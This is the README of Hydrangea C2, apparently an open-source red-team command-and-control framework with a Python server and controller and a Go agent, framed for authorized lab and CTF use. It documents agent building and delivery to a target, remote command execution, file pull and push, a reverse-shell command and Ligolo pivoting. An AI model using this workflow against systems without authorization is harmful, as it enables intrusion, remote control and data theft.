# Hydrangea C2

```
   ▄█    █▄    ▄██   ▄   ████████▄     ▄████████    ▄████████ ███▄▄▄▄      ▄██████▄     ▄████████    ▄████████
  ███    ███   ███   ██▄ ███   ▀███   ███    ███   ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███    ███
  ███    ███   ███▄▄▄███ ███    ███   ███    ███   ███    ███ ███   ███   ███    █▀    ███    █▀    ███    ███
 ▄███▄▄▄▄███▄▄ ▀▀▀▀▀▀███ ███    ███  ▄███▄▄▄▄██▀   ███    ███ ███   ███  ▄███         ▄███▄▄▄       ███    ███
▀▀███▀▀▀▀███▀  ▄██   ███ ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ ███   ███ ▀▀███ ████▄  ▀▀███▀▀▀     ▀███████████
  ███    ███   ███   ███ ███    ███ ▀███████████   ███    ███ ███   ███   ███    ███   ███    █▄    ███    ███
  ███    ███   ███   ███ ███   ▄███   ███    ███   ███    ███ ███   ███   ███    ███   ███    ███   ███    ███
  ███    █▀     ▀█████▀  ████████▀    ███    ███   ███    █▀   ▀█   █▀    ████████▀    ██████████   ███    █▀
                                      ███    ███

              Hydrangea C2  •  V4.0
```

A lightweight C2 framework for post-exploitation fleet management in authorized environments. Python server and controller, Go agent. No bloat, no magic — explicit orders in, explicit results out.

> [!CAUTION]
> For lawful, authorized use only — lab work, CTFs, and environments you own or have explicit permission to operate in. You are responsible for complying with all applicable laws. The authors accept no liability for misuse.

Full documentation: [Wiki](https://github.com/tristanqtn/Hydrangea-C2/wiki)

---

## Architecture

```
[ Controller ]  ── ADMIN RPC ──▶  [ Server ]  ══ orders ══▶  [ Agent(s) ]
                                              ◀══ results ══
```

- **Server** — async TCP server, two distinct port types: one admin port for the controller, one or more agent ports for beacons
- **Controller** — interactive REPL (arrow-key history, tab completion, Rich UI)
- **Agent** — Go binary, reconnects automatically, executes orders in the background

---

## Setup

**Requirements:** Python 3.10+, Poetry, Go 1.23+ (agent build), `openssl` in PATH (TLS auto-cert)

```bash
poetry install
```

If you have [Nix](https://nixos.org/) with flakes enabled, no installation is required — see [Running with Nix](#running-with-nix) below.

---

## Running

### Server

```bash
poetry run hydrangea-server \
  --admin-port 9000 --ports 9001 \
  --admin-token <ctl-secret> --agent-token <beacon-secret>
```

| Flag | Description |
|---|---|
| `--admin-port` | Port for the controller (admin connections only) |
| `--ports` | Port(s) for agent connections (space-separated) |
| `--admin-token` | Auth token for the controller |
| `--agent-token` | Auth token for agents (repeatable) |
| `--storage` | Directory for received files (default: `./server_storage`) |
| `--tls-auto` | Generate a self-signed cert via `openssl` |
| `--tls-cert` / `--tls-key` | Use your own certificate |

When TLS is enabled the server prints a SHA-256 fingerprint — use it with `--tls-fingerprint` on the controller and agents to pin the certificate.

### Controller

```bash
poetry run hydrangea-ctl --host 127.0.0.1 --port 9000 --auth-token <ctl-secret>

# With TLS
poetry run hydrangea-ctl --port 9000 --auth-token <ctl-secret> \
  --tls --tls-fingerprint <hex>
```

### Agent

Build from the controller REPL (recommended):

```
hydrangea ❯  build-client --server-host 10.0.0.1 --server-port 9001 \
               --build-auth-token <beacon-secret> --out ./dist
```

Then serve and fetch on target:

```
hydrangea ❯  serve-files --path ./dist
  http://10.0.0.1:8888/
```

```bash
# On target
./hydrangea-client --server 10.0.0.1 --port 9001 --auth-token <beacon-secret>
```

---

## Running with Nix

With [Nix](https://nixos.org/) and flakes enabled, the server and controller can be run directly without installing Python or Poetry:

```bash
# Server
nix run github:tristanqtn/Hydrangea-C2#hydrangea-server -- \
  --admin-port 9000 --ports 9001 \
  --admin-token <ctl-secret> --agent-token <beacon-secret>

# Controller
nix run github:tristanqtn/Hydrangea-C2#hydrangea-ctl -- \
  --port 9000 --auth-token <ctl-secret>
```

From a local clone, replace `github:tristanqtn/Hydrangea-C2` with `.`.
Go agents can be cross-compiled with `nix build .#hydrangea-client-linux` and `nix build .#hydrangea-client-windows`.

---

## REPL Commands

### Agents

| Command | Description |
|---|---|
| `clients` | List connected agents |
| `use <id>` / `unuse` | Set or clear the active agent context |
| `ping [--client <id>]` | Round-trip time to agent |
| `session [--client <id>]` | OS, user, PID, hostname, cwd |

### Files & Exec

| Command | Description |
|---|---|
| `list --path <p> [--client <id>]` | List a directory on the agent |
| `pull --src <remote> --dest <local>` | Pull a file from agent to server storage |
| `push --src <local> --dest <remote>` | Push a file to the agent |
| `exec --command "<cmd>" [--shell] [--client <id>]` | Run a command on the agent |

### Post-Exploitation

| Command | Description |
|---|---|
| `reverse-shell <host:port> [--client <id>]` | Agent dials back — start your listener first |
| `port-forward --ligolo-path <bin> --connect-args "<args>"` | Upload and launch a Ligolo agent |

### Build & Serve

| Command | Description |
|---|---|
| `build-client [--os linux\|windows] [--build-tls] ...` | Compile Go agents with baked-in parameters |
| `serve-files --path <dir> [--port 8888]` | Serve a directory over HTTP |
| `stop-serve` | Stop the HTTP file server |

### Server Management

| Command | Description |
|---|---|
| `server-status` | Health and recent logs |
| `server-config` | Current ports and token configuration |
| `server-exec --command "<cmd>"` | Run a command on the server host |
| `add-agent-token --token <t> [--port <p>]` | Add a global or port-exclusive agent token |
| `add-agent-port --port <p> [--token <t>]` | Open a new agent port at runtime |
| `remove-agent-token --token <t> [--port <p>]` | Remove an agent token |
| `remove-agent-port --port <p>` | Close an agent port and evict its beacons |
| `local <cmd>` | Run a command locally on the controller machine |

---

## Development

```bash
poetry run ruff check server/
poetry run ruff format server/
```
